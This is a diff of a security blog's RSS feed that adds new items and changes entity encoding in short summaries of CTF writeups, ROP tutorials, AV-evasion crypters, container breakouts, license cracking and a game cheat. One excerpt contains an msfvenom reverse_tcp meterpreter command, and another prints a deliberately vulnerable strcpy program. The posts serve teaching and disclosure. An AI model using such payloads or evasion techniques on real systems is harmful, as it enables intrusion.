@@ -6,10 +6,32 @@
     <description>Recent content in Posts on BananaMafia</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 19 Nov 2019 00:00:00 +0000</lastBuildDate>
+    <lastBuildDate>Mon, 30 Dec 2019 00:00:00 +0000</lastBuildDate>
     
 	<atom:link href="https://bananamafia.dev/post/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>36C3 CTF Writeups</title>
+      <link>https://bananamafia.dev/post/36c3ctf/</link>
+      <pubDate>Mon, 30 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://bananamafia.dev/post/36c3ctf/</guid>
+      <description>1337 skills Task description:
+It’s too hard to gain all 1337 h4x0r skills required by nowadays CTFs ._.! I am glad a friendly hacker told me about an App he got during a (growth) hacking course. Sadly, he didn’t wrote down any activations codes.
+Ready for your hacking exam?
+ As can be read above, an Android app was given at the beginning of the challenge, with the hint to get a valid activation code for it.</description>
+    </item>
+    
+    <item>
+      <title>Open Redirects In State Parameters</title>
+      <link>https://bananamafia.dev/post/openredirect/</link>
+      <pubDate>Tue, 17 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://bananamafia.dev/post/openredirect/</guid>
+      <description>Now that the deadline to fix this vulnerability has passed, I&#39;ve decided to publish this blog post that covers a web vulnerability I&#39;ve found in the login mechanism of a particular company.
+Everything started when I had a look at a more complex part of a public web application of this vendor. The web application that gives out a link to the user that can be used to open up the same user state again at a later point.</description>
+    </item>
     
     <item>
       <title>ROP on ARM with radare2</title>
@@ -17,9 +39,8 @@
       <pubDate>Tue, 19 Nov 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/rop-arm-1/</guid>
-      <description>Exploit development on ARM with radare2 seems like a great idea until you start searching for resources, searching for a nice and automated debugging setup. Here&amp;rsquo;s what I&amp;rsquo;ve found:
-nothing
-Cool. That&amp;rsquo;s the reason why this post covers the setup I came up with, as well as basics for ROP on the ARM architecture. The exploit target is stack6 from Azeria Labs and radare2 will be used as a debugger.</description>
+      <description>Exploit development on ARM with radare2 seems like a great idea until you start searching for resources, searching for a nice and automated debugging setup. Here&#39;s what I&#39;ve found:
+nothingCool. That&#39;s the reason why this post covers the setup I came up with, as well as basics for ROP on the ARM architecture. The exploit target is stack6 from Azeria Labs and radare2 will be used as a debugger. If you&#39;re a beginner I suggest reading the ARM assembly basics on the same site first before starting the challenges from the beginning with stack0.</description>
     </item>
     
     <item>
@@ -28,7 +49,7 @@ Cool. That&amp;rsquo;s the reason why this post covers the setup I came up with,
       <pubDate>Thu, 24 Oct 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/frida-fuzz/</guid>
-      <description>In a previous post I&amp;rsquo;ve already covered Frida and its instrumentation abilities. But check this out: You can also use Frida to perform fuzzing. What&amp;rsquo;s even greater is that Frida allows in-process fuzzing.
+      <description>In a previous post I&#39;ve already covered Frida and its instrumentation abilities. But check this out: You can also use Frida to perform fuzzing. What&#39;s even greater is that Frida allows in-process fuzzing.
 Why would you want to do this? There may be various reasons, but the most outstanding one for me is building a fuzzing harness for closed source applications and libraries. Just take Counter Strike GO as an example:</description>
     </item>
     
@@ -38,7 +59,7 @@ Why would you want to do this? There may be various reasons, but the most outsta
       <pubDate>Wed, 16 Oct 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/dotfiles/</guid>
-      <description>You want to customize your Linux dotfiles, whether you already know it or not. After investing way too much time into this, I&amp;rsquo;ve decided to share some results and tricks in this blog post.
+      <description>You want to customize your Linux dotfiles, whether you already know it or not. After investing way too much time into this, I&#39;ve decided to share some results and tricks in this blog post.
 General Structure The first thing to do is to create a general structure for your dotfiles and all associated files and scripts. I came up with this structure:
 dotfiles ├── aliases ├── bashrc ├── bindings: Additional key bindings ├── exports: Shell-wide exports ├── i3: Config and bar for i3 window manager │ ├── config │ ├── polybar │ └── scripts ├── Makefile: Generate readme and call shellcheck on push [.</description>
     </item>
@@ -49,8 +70,8 @@ dotfiles ├── aliases ├── bashrc ├── bindings: Additional key b
       <pubDate>Tue, 01 Oct 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/r2wars-2019/</guid>
-      <description>As every year at r2con, the r2wars competition was hosted by sanguinawer and the r2 overlord pancake. I&amp;rsquo;ve made it to the second place in this year&amp;rsquo;s battles, so I&amp;rsquo;ve promised to create a writeup for my participation &amp;ndash; and here it is. Welcome to the nerdiest game in town.
-Lol What&amp;rsquo;s r2wars Again? The r2wars competition is based on radare2&amp;rsquo;s ESIL (Evaluable Strings Intermediate Language) engine. It&amp;rsquo;s normally used to emulate instructions of various architectures during reverse engineering.</description>
+      <description>As every year at r2con, the r2wars competition was hosted by sanguinawer and the r2 overlord pancake. I&#39;ve made it to the second place in this year&#39;s battles, so I&#39;ve promised to create a writeup for my participation &amp;ndash; and here it is. Welcome to the nerdiest game in town.
+Lol What&#39;s r2wars Again? The r2wars competition is based on radare2&#39;s ESIL (Evaluable Strings Intermediate Language) engine. It&#39;s normally used to emulate instructions of various architectures during reverse engineering.</description>
     </item>
     
     <item>
@@ -59,7 +80,7 @@ Lol What&amp;rsquo;s r2wars Again? The r2wars competition is based on radare2&am
       <pubDate>Fri, 13 Sep 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/r2frida-1/</guid>
-      <description>One of my main takeaways from this year&amp;rsquo;s r2con is that Frida is cool and that r2frida, the integration with radare2, is even cooler. Using this, it&amp;rsquo;s possible to pair the benefits of dynamic instrumentation of Frida with the analysis features and workflow of radare2. This is a small tutorial to get started with both Frida and r2frida that&amp;rsquo;s based on the r2xor challenge of the recent r2con CTF. Please note that this is not a complete writeup for r2xor.</description>
+      <description>One of my main takeaways from this year&#39;s r2con is that Frida is cool and that r2frida, the integration with radare2, is even cooler. Using this, it&#39;s possible to pair the benefits of dynamic instrumentation of Frida with the analysis features and workflow of radare2. This is a small tutorial to get started with both Frida and r2frida that&#39;s based on the r2xor challenge of the recent r2con CTF. Please note that this is not a complete writeup for r2xor.</description>
     </item>
     
     <item>
@@ -68,7 +89,7 @@ Lol What&amp;rsquo;s r2wars Again? The r2wars competition is based on radare2&am
       <pubDate>Mon, 02 Sep 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/r2ctf-2019/</guid>
-      <description>r2boy1 The first GameBoy challenge was rather easy. The idea was to talk to the Pancake character in-game in order to get the flag. The problem is that Pancake chills behind a wall. One possible solution was to glitch through the wall, however I&amp;rsquo;ve solved this using static analysis.
+      <description>r2boy1 The first GameBoy challenge was rather easy. The idea was to talk to the Pancake character in-game in order to get the flag. The problem is that Pancake chills behind a wall. One possible solution was to glitch through the wall, however I&#39;ve solved this using static analysis.
 Going through the strings and searching for a possible dialog yields interesting strings:
 [0x00054075]&amp;gt; izzq~pancake 0x54016 37 36 Find pancake\nthrough a game\nglitch!</description>
     </item>
@@ -79,7 +100,7 @@ Going through the strings and searching for a possible dialog yields interesting
       <pubDate>Thu, 29 Aug 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/x64-rop-redpwn/</guid>
-      <description>Based on the Stop, ROP, n&amp;rsquo;, Roll challenge from this year&amp;rsquo;s Redpwn CTF, this post will explain how to make system calls on x64 using ROP in order to spawn a shell. Also, it shows how to abuse writable memory regions of a process to overcome difficulties with some ROP gadgets. And the best thing is, two of the gadgets used in this writeup are universal and most likely also present in your x64 target if it&amp;rsquo;s using glibc.</description>
+      <description>Based on the Stop, ROP, n&amp;rsquo;, Roll challenge from this year&#39;s Redpwn CTF, this post will explain how to make system calls on x64 using ROP in order to spawn a shell. Also, it shows how to abuse writable memory regions of a process to overcome difficulties with some ROP gadgets. And the best thing is, two of the gadgets used in this writeup are universal and most likely also present in your x64 target if it&#39;s using glibc.</description>
     </item>
     
     <item>
@@ -100,8 +121,9 @@ private static void Main(string[] args) { byte[] sourceArray = File.ReadAllBytes
       <pubDate>Sat, 24 Aug 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/php-deserialize-cccamp19/</guid>
-      <description>Deserialization is a vulnerability class that&amp;rsquo;s often overlooked. It&amp;rsquo;s great that this year&amp;rsquo;s CCCamp CTF included an interesting web based challenge that is based on this vulnerability class.
-The Target The challenge includes a link to a web service that allows converting user-supplied images into PDF files. Users can upload image files, add some additional HTML content in a textbox and render the whole thing into a PDF file:</description>
+      <description>Deserialization is a vulnerability class that&#39;s often overlooked. It&#39;s great that this year&#39;s CCCamp CTF included an interesting web based challenge that is based on this vulnerability class.
+The Target The challenge includes a link to a web service that allows converting user-supplied images into PDF files. Users can upload image files, add some additional HTML content in a textbox and render the whole thing into a PDF file:
+A ZIP file with the source code of the web application is also available.</description>
     </item>
     
     <item>
@@ -110,9 +132,9 @@ The Target The challenge includes a link to a web service that allows converting
       <pubDate>Tue, 13 Aug 2019 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/binary-rop-stackpivot/</guid>
-      <description>Let&amp;rsquo;s check out Return Oriented Programming (ROP) with the pivot32 challenge from ROP Emporium by using radare2. The pivot32 binary is compiled without stack canaries and PIE but has NX enabled.
+      <description>Let&#39;s check out Return Oriented Programming (ROP) with the pivot32 challenge from ROP Emporium by using radare2. The pivot32 binary is compiled without stack canaries and PIE but has NX enabled.
 Basics The general principle behind ROP is that:
-[&amp;hellip;] an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine&amp;rsquo;s memory, called &amp;ldquo;gadgets&amp;rdquo;.</description>
+[&amp;hellip;] an attacker gains control of the call stack to hijack program control flow and then executes carefully chosen machine instruction sequences that are already present in the machine&#39;s memory, called &amp;ldquo;gadgets&amp;rdquo;.</description>
     </item>
     
     <item>
@@ -123,7 +145,7 @@ Basics The general principle behind ROP is that:
       <guid>https://bananamafia.dev/post/cryptoctf-1-decodeme/</guid>
       <description>This is short writeup on the Decode Me challenge of the first CryptoCTF.
 The following string has to be decoded into a flag somehow:
-D: mb xwhvxw mlnX 4X6AhPLAR4eupSRJ6FLt8AgE6JsLdBRxq57L8IeMyBRHp6IGsmgFIB5E :ztey xam lb lbaH  The first thing that comes to mind is that some sort of substitution cipher was being used in the first place. A cipher of this kind is the Caesar cipher which is also known as ROT. Fiddling around with this cipher and a key of 7 yields:</description>
+D: mb xwhvxw mlnX 4X6AhPLAR4eupSRJ6FLt8AgE6JsLdBRxq57L8IeMyBRHp6IGsmgFIB5E :ztey xam lb lbaH The first thing that comes to mind is that some sort of substitution cipher was being used in the first place. A cipher of this kind is the Caesar cipher which is also known as ROT. Fiddling around with this cipher and a key of 7 yields:</description>
     </item>
     
     <item>
@@ -133,11 +155,11 @@ D: mb xwhvxw mlnX 4X6AhPLAR4eupSRJ6FLt8AgE6JsLdBRxq57L8IeMyBRHp6IGsmgFIB5E :ztey
       
       <guid>https://bananamafia.dev/post/binary-canary-bruteforce/</guid>
       <description>And now for something more CTF-y: Dealing with stack canaries by brute-forcing their value byte by byte.
-How Stack Canaries Work If you&amp;rsquo;ve ever read the error message *** stack smashing detected ***: &amp;lt;...&amp;gt; terminated, you&amp;rsquo;ve already encountered stack canaries in action. They are being used to detect and stop buffer overflows by placing a per-process randomized value between the local variables and the saved return address. If an attacker somehow manages to write across the boundary of a buffer in order to overwrite the saved return address, he will also overwrite the canary.</description>
+How Stack Canaries Work If you&#39;ve ever read the error message *** stack smashing detected ***: &amp;lt;...&amp;gt; terminated, you&#39;ve already encountered stack canaries in action. They are being used to detect and stop buffer overflows by placing a per-process randomized value between the local variables and the saved return address. If an attacker somehow manages to write across the boundary of a buffer in order to overwrite the saved return address, he will also overwrite the canary.</description>
     </item>
     
     <item>
-      <title>r2con 2019 PwnDebian Challenge: Exploiting radare2 (CVE-2019-14745)</title>
+      <title>r2con 2019 PwnDebian Challenge: Exploiting radare2 (CVE-2019-14745, CVE-2019-16718)</title>
       <link>https://bananamafia.dev/post/r2-pwndebian/</link>
       <pubDate>Tue, 30 Jul 2019 00:00:00 +0000</pubDate>
       
@@ -146,7 +168,7 @@ How Stack Canaries Work If you&amp;rsquo;ve ever read the error message *** stac
 Everyone knows: This years r2con, the conference about radare2, has a very special challenge &amp;ndash; PwnDebian:
 The almighty blenk92 and me decided to assist the radare2 project in finding such an exploit an we think we were quite successful :)
 But first some basics for r2.
-Shelling Out Via The r2 Shell While running r2, it&amp;rsquo;s possible to shell out and execute shell commands without leaving the r2 console:</description>
+Shelling Out Via The r2 Shell While running r2, it&#39;s possible to shell out and execute shell commands without leaving the r2 console:</description>
     </item>
     
     <item>
@@ -177,7 +199,7 @@ The features therefore include:
       
       <guid>https://bananamafia.dev/post/binary-aslr-dep-32/</guid>
       <description>This post covers basic basics of bypassing ASLR and DEP with r2. For this, a vulnerable application, yolo.c, is required:
-#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; void lol(char *b) { char buffer[1337]; strcpy(buffer, b); } int main(int argc, char **argv) { lol(argv[1]); }  64-Bit vs 32-Bit Binaries The issue here should be quite obvious - strcpy blindly copies the user-controlled input buffer b into buffer which causes a buffer overflow.</description>
+#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; void lol(char *b) { char buffer[1337]; strcpy(buffer, b); } int main(int argc, char **argv) { lol(argv[1]); } 64-Bit vs 32-Bit Binaries The issue here should be quite obvious - strcpy blindly copies the user-controlled input buffer b into buffer which causes a buffer overflow. Since normally ASLR and DEP are enabled, the following things don&#39;t just work out of the box:</description>
     </item>
     
     <item>
@@ -196,8 +218,8 @@ Leak of audio device status of the host When media is being played on the host, 
       <pubDate>Fri, 26 Oct 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/rnd-092345-gdb/</guid>
-      <description>When trying to exploit an application it&amp;rsquo;s useful to send the input via gdb to immediately check how the input is being processed. But once the gdb is open it&amp;rsquo;s sometimes not clear how to pass binary input to applications reading from stdin, e.g. using read. An easy way is to start the debugging session with gdb ./binary and using
-run &amp;lt; &amp;lt;(printf &amp;quot;\xAA\xAA\xAA&amp;quot;)  from the gdb session to send arbitrary bytes.</description>
+      <description>When trying to exploit an application it&#39;s useful to send the input via gdb to immediately check how the input is being processed. But once the gdb is open it&#39;s sometimes not clear how to pass binary input to applications reading from stdin, e.g. using read. An easy way is to start the debugging session with gdb ./binary and using
+run &amp;lt; &amp;lt;(printf &amp;quot;\xAA\xAA\xAA&amp;quot;) from the gdb session to send arbitrary bytes.</description>
     </item>
     
     <item>
@@ -207,7 +229,7 @@ run &amp;lt; &amp;lt;(printf &amp;quot;\xAA\xAA\xAA&amp;quot;)  from the gdb ses
       
       <guid>https://bananamafia.dev/post/autohax/</guid>
       <description>Ever wondered about the various techniques that can be applied to hack modern cars? This post documents various ways to do so - you can use it as a cheatsheet
-Software There are multiple ways one can interface with the software stack of a car. The easiest one is to use USB-to-Ethernet adapters in order to attach to the network of the car. It&amp;rsquo;s important to use special adapters that are whitelisted on the car&amp;rsquo;s head unit.</description>
+Software There are multiple ways one can interface with the software stack of a car. The easiest one is to use USB-to-Ethernet adapters in order to attach to the network of the car. It&#39;s important to use special adapters that are whitelisted on the car&#39;s head unit.</description>
     </item>
     
     <item>
@@ -216,8 +238,8 @@ Software There are multiple ways one can interface with the software stack of a 
       <pubDate>Tue, 28 Aug 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/multihack/</guid>
-      <description>What? This post covers creating a multihack for multiplayer games. The target is a Quake3 based game called Jedi Academy. I&amp;rsquo;ve found the techniques and process of doing this to be fairly undocumented and obscure, so this can serve as a starting point for researchers and game hackers.
-I&amp;rsquo;ve released my multihack source code. These are the implemented features:
+      <description>What? This post covers creating a multihack for multiplayer games. The target is a Quake3 based game called Jedi Academy. I&#39;ve found the techniques and process of doing this to be fairly undocumented and obscure, so this can serve as a starting point for researchers and game hackers.
+I&#39;ve released my multihack source code. These are the implemented features:
  Wallhack (seeing enemies through walls) Player Glow (Enemies are glowing) Cheat Unlocker (Use otherwise blocked client side settings) Triggerbot (Automatically pull the trigger and shoot at enemies once they are in the crosshair)  This is what the wallhack and player glow looks like:</description>
     </item>
     
@@ -227,7 +249,7 @@ I&amp;rsquo;ve released my multihack source code. These are the implemented feat
       <pubDate>Thu, 16 Aug 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/cvar-hax/</guid>
-      <description>When it comes to patching certain functions of a binary on ASM level, it&amp;rsquo;s often performed by modifying the binary itself. This post shows a different approach to accomplish the same thing: Removing game cheat protections using runtime function patching.
+      <description>When it comes to patching certain functions of a binary on ASM level, it&#39;s often performed by modifying the binary itself. This post shows a different approach to accomplish the same thing: Removing game cheat protections using runtime function patching.
 The Target This is being shown in the following context: Quake3 based multiplayer games include certain settings (CVars) which are disabled for players to prevent cheating. These settings would enable clients to disable fog and shadows and use different camera angles.</description>
     </item>
     
@@ -237,7 +259,7 @@ The Target This is being shown in the following context: Quake3 based multiplaye
       <pubDate>Wed, 20 Jun 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/rnd-632424-2fa-backup/</guid>
-      <description>Using 2 factor authentication generally is a good idea. However, losing 2 factor data can be the opposite. If you&amp;rsquo;re using Google Authenticator to generate 2FA codes, you may have wondered how to backup the data the app uses to generate codes. The method described here requires root access of course but doesn&amp;rsquo;t require a third party app. Please note that you can always use apps that backup app data but recovering this data on newer Android versions can fail.</description>
+      <description>Using 2 factor authentication generally is a good idea. However, losing 2 factor data can be the opposite. If you&#39;re using Google Authenticator to generate 2FA codes, you may have wondered how to backup the data the app uses to generate codes. The method described here requires root access of course but doesn&#39;t require a third party app. Please note that you can always use apps that backup app data but recovering this data on newer Android versions can fail.</description>
     </item>
     
     <item>
@@ -251,7 +273,7 @@ Mount the X11 socket they said.
 Allow other users to access your X session they said.
 This post covers Docker container breakouts by abusing bad security practices related to the X11 socket.
 The problem To display windows spawned through a Docker container, people often launch containers following these steps:
- Use -e DISPLAY=$DISPLAY to share the display variable value Specifying -v /tmp/.</description>
+ Use -e DISPLAY=$DISPLAY to share the display variable value Specifying -v /tmp/.X11-unix:/tmp/.X11-unix:ro shares the X11 socket - optionally as read only.</description>
     </item>
     
     <item>
@@ -262,8 +284,8 @@ The problem To display windows spawned through a Docker container, people often 
       <guid>https://bananamafia.dev/post/shell-upgrade/</guid>
       <description>Ended up with a cheap nc shell and want to upgrade to a &amp;ldquo;real&amp;rdquo; shell with a proper TTY and navigation?
 Say no more &amp;lt;:
-1. Upgrading using shell magic This doesn&amp;rsquo;t always work - however if Python is present on the victims machine, it&amp;rsquo;s worth a try.
- Use bash on the attacker machine, zsh doesn&amp;rsquo;t seem to work. Get the nc shell. In the shell, execute python -c &#39;import pty; pty.</description>
+1. Upgrading using shell magic This doesn&#39;t always work - however if Python is present on the victims machine, it&#39;s worth a try.
+ Use bash on the attacker machine, zsh doesn&#39;t seem to work. Get the nc shell. In the shell, execute python -c &#39;import pty; pty.</description>
     </item>
     
     <item>
@@ -273,9 +295,9 @@ Say no more &amp;lt;:
       
       <guid>https://bananamafia.dev/post/python-hax/</guid>
       <description>tl;dr Be aware that imports can be hijacked for Python2 and Python3 - take care of EUIDs.
-Don&amp;rsquo;t use input() for Python2.x.
+Don&#39;t use input() for Python2.x.
 Module Hijacking When assigning SUID bits to Python scripts, privileges can be escalated easily. Consider the following Python source code:
-#!/usr/bin/python2.7 # -*- coding: utf-8 -*- import hashlib value = raw_input() md5 = hashlib.md5() md5.update(value) print md5.digest()  Note that in case of SUID binaries this code runs as root.</description>
+#!/usr/bin/python2.7 # -*- coding: utf-8 -*- import hashlib value = raw_input() md5 = hashlib.md5() md5.update(value) print md5.digest() Note that in case of SUID binaries this code runs as root.</description>
     </item>
     
     <item>
@@ -286,7 +308,7 @@ Module Hijacking When assigning SUID bits to Python scripts, privileges can be e
       <guid>https://bananamafia.dev/post/mserver-crack/</guid>
       <description>tl;dr Generating licenses using MD5(email) is bad.
 Validating licenses using HTTP in plain text is bad.
-The Software This post covers reverse engineering and cracking the license validation process of a popular and closed source self hosted music server application. The developer has been notified about the findings, however no reply has been received. The validation issues still exist as of now and affects all issued licenses. Because of this, the name of the application won&amp;rsquo;t be disclosed.</description>
+The Software This post covers reverse engineering and cracking the license validation process of a popular and closed source self hosted music server application. The developer has been notified about the findings, however no reply has been received. The validation issues still exist as of now and affects all issued licenses. Because of this, the name of the application won&#39;t be disclosed.</description>
     </item>
     
     <item>
@@ -295,7 +317,7 @@ The Software This post covers reverse engineering and cracking the license valid
       <pubDate>Tue, 10 Apr 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/pairprog/</guid>
-      <description>Recently I&amp;rsquo;ve created a small docker container to perform remote pair programming. Shared shell sessions are an easy way to remotely interact with coworkers or other people. With additional docker magic you now don&amp;rsquo;t even have to give them access to your host system - they will be contained just like you and the work that&amp;rsquo;s being done. Using my docker image, it&amp;rsquo;s possible to share a tmux session with a group of people.</description>
+      <description>Recently I&#39;ve created a small docker container to perform remote pair programming. Shared shell sessions are an easy way to remotely interact with coworkers or other people. With additional docker magic you now don&#39;t even have to give them access to your host system - they will be contained just like you and the work that&#39;s being done. Using my docker image, it&#39;s possible to share a tmux session with a group of people.</description>
     </item>
     
     <item>
@@ -305,7 +327,7 @@ The Software This post covers reverse engineering and cracking the license valid
       
       <guid>https://bananamafia.dev/post/rnd-23542352/</guid>
       <description>When writing Dockerfiles, people often use something like this to download and install software from GitHub:
-ENV SOFTWARE_VERSION 1.33.7 RUN curl -sSL \ https://github.com/user/repo/releases/download/${SOFTWARE_VERSION}/amd64.deb  This can be optimized so that always the newest version gets used, which also simplifies maintaining the Dockerfile because updating happens automatically:
+ENV SOFTWARE_VERSION 1.33.7 RUN curl -sSL \ https://github.com/user/repo/releases/download/${SOFTWARE_VERSION}/amd64.deb This can be optimized so that always the newest version gets used, which also simplifies maintaining the Dockerfile because updating happens automatically:
 curl -sSL \ $(curl -sSL https://api.github.com/repos/user/repo/releases/latest | \ grep &amp;quot;browser_download_url&amp;quot; | \ grep &amp;quot;amd64.deb&amp;quot; | \ cut -d &amp;quot;:&amp;quot; -f 2,3 | \ tr --delete \&amp;quot; | \ tr --delete &amp;quot; &amp;quot;) \ -o /tmp/software-amd64.</description>
     </item>
     
@@ -317,7 +339,7 @@ curl -sSL \ $(curl -sSL https://api.github.com/repos/user/repo/releases/latest |
       <guid>https://bananamafia.dev/post/crypt0r/</guid>
       <description>tl;dr AVs can easily be bypassed using malware AES crypters like Crypt0r:
 Open Source Evasion Techniques All of the following results are based on a meterpreter file which was generated like this:
-msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=192.168.1.1 LPORT=1337 -o meter.exe  All scans are performed on VirusTotal. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren&amp;rsquo;t required at all.</description>
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=192.168.1.1 LPORT=1337 -o meter.exe All scans are performed on VirusTotal. Please not that this covers static analysis only. However, it will become clear later on that dynamic analysis of the used techniques aren&#39;t required at all.</description>
     </item>
     
     <item>
@@ -326,7 +348,7 @@ msfvenom -p windows/meterpreter/reverse_tcp --platform windows -f exe LHOST=192.
       <pubDate>Fri, 16 Mar 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/monit/</guid>
-      <description>After setting up 329423 services and 823423 containers, you might want to manage your environment in case some service fails. This can be automated restarting, getting notified about failures or a similar thing. Say no more, I&amp;rsquo;ve created a Dockerfile and image for Monit for this.
+      <description>After setting up 329423 services and 823423 containers, you might want to manage your environment in case some service fails. This can be automated restarting, getting notified about failures or a similar thing. Say no more, I&#39;ve created a Dockerfile and image for Monit for this.
 Monit is extremely configurable and allows a maximum of flexibility when it comes to monitoring.
 Initially, a configuration file is required to get started. To get one, call</description>
     </item>
@@ -337,8 +359,8 @@ Initially, a configuration file is required to get started. To get one, call</de
       <pubDate>Thu, 15 Mar 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/realtek-driverutil/</guid>
-      <description>This kind of vulnerability is really old. However, vendors still fail to properly address this issue. This is just another example of exploiting this kind of vulnerability on Windows 10 with the most up-to-date ALFA AWUS036AC driver utility (version 1030.6). Note that the download link points to alfa.com but the driver utility itself says it&amp;rsquo;s developed by REALTEK.
-The vulnerability Upon installing the driver utility, two vulnerable services get installed.</description>
+      <description>This kind of vulnerability is really old. However, vendors still fail to properly address this issue. This is just another example of exploiting this kind of vulnerability on Windows 10 with the most up-to-date ALFA AWUS036AC driver utility (version 1030.6). Note that the download link points to alfa.com but the driver utility itself says it&#39;s developed by REALTEK.
+The vulnerability Upon installing the driver utility, two vulnerable services get installed. This can be checked using the following command:</description>
     </item>
     
     <item>
@@ -348,7 +370,7 @@ The vulnerability Upon installing the driver utility, two vulnerable services ge
       
       <guid>https://bananamafia.dev/post/docker-borg/</guid>
       <description>BorgBackup is a secure backup solution which is also easy to use. It provides compression, encryption, deduplication and authentication.
-Getting started I&amp;rsquo;ve created a Dockerfile based on Alpine Linux which is also available on DockerHub. It gets built weekly to always stay up to date.
+Getting started I&#39;ve created a Dockerfile based on Alpine Linux which is also available on DockerHub. It gets built weekly to always stay up to date.
 This Makefile can be used to quickly get started using a containerized version of Borg:
 SHELL := /bin/bash VERSION ?= latest # The directory of this file DIR := $(shell echo $(shell cd &amp;quot;$(shell dirname &amp;quot;${BASH_SOURCE[0]}&amp;quot; )&amp;quot; &amp;amp;&amp;amp; pwd )) IMAGE_NAME ?</description>
     </item>
@@ -369,7 +391,7 @@ After spending a lot of time and effort on your Dotfiles, it may be useful to se
       <pubDate>Thu, 08 Mar 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/dotfile-shellcheck/</guid>
-      <description>In order to prevent errors and side effects, it&amp;rsquo;s useful to use Shellcheck to lint all shell scripts. While checking out the Dotfiles of jessfraz, I came across an easy way to integrate this kind of check with Travis CI. The mentioned approach triggers a travis linting process after pushing to to the Dotfiles repository on GitHub. This post will explain all necessary steps to integrate this process into your own repository.</description>
+      <description>In order to prevent errors and side effects, it&#39;s useful to use Shellcheck to lint all shell scripts. While checking out the Dotfiles of jessfraz, I came across an easy way to integrate this kind of check with Travis CI. The mentioned approach triggers a travis linting process after pushing to to the Dotfiles repository on GitHub. This post will explain all necessary steps to integrate this process into your own repository.</description>
     </item>
     
     <item>
@@ -378,8 +400,8 @@ After spending a lot of time and effort on your Dotfiles, it may be useful to se
       <pubDate>Wed, 07 Mar 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/telegram-notifications/</guid>
-      <description>If you ever wanted to get notified when certain things happen but didn&amp;rsquo;t find a lightweight solution &amp;ndash; here comes captain Telegram.
-Using a simple Telegram bot, it&amp;rsquo;s possible to send notifications to your mobile phone or browser. All the notifier node needs is curl installed.
+      <description>If you ever wanted to get notified when certain things happen but didn&#39;t find a lightweight solution &amp;ndash; here comes captain Telegram.
+Using a simple Telegram bot, it&#39;s possible to send notifications to your mobile phone or browser. All the notifier node needs is curl installed.
 Registering a bot First of all, a Telegram bot has to be registered in order to send messages later on. Follow these steps to get started:</description>
     </item>
     
@@ -389,7 +411,7 @@ Registering a bot First of all, a Telegram bot has to be registered in order to 
       <pubDate>Mon, 15 Jan 2018 00:00:00 +0000</pubDate>
       
       <guid>https://bananamafia.dev/post/docker-jenkins/</guid>
-      <description>Note: This isn&amp;rsquo;t up to date anymore, instead use img .
+      <description>Note: This isn&#39;t up to date anymore, instead use img .
 First of all – why should you want to build all the docker images on your own build server?
  Complete control over the build process You know when the images are built and how up-to-date they are Use of private repositories and images Because you can  This assumes that you already have control over a private docker registry.</description>
     </item>
@@ -401,7 +423,7 @@ First of all – why should you want to build all the docker images on your own 
       
       <guid>https://bananamafia.dev/post/write-diary/</guid>
       <description>WriteDiary consists of a webapp and an Android app (version 4.72). For the audit, the android app was the primary target.
-The developer and owner of both the webapp and android app has been contacted multiple times to develop a quick fix for the issues addressed in this blog post and a vulnerability concerning the webapp which isn&amp;rsquo;t described here. However, no response has been received. This is bad, as you will see in the first finding:</description>
+The developer and owner of both the webapp and android app has been contacted multiple times to develop a quick fix for the issues addressed in this blog post and a vulnerability concerning the webapp which isn&#39;t described here. However, no response has been received. This is bad, as you will see in the first finding:</description>
     </item>
     
   </channel>
